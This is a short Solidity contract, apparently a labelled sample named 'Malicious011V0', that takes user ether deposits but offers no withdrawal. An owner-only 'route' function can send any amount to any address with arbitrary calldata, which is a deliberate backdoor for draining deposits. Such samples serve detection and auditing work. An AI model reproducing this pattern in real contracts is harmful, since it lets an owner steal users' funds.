// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious011V0 {
    address public owner;
    mapping(address => uint256) public deposits;
    constructor() { owner = msg.sender; }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function deposit() external payable { deposits[msg.sender] += msg.value; }

    function route(address target, uint256 value, bytes calldata data) external onlyOwner {
        (bool ok,) = target.call{value: value}(data);
        require(ok, "call");
    }
}
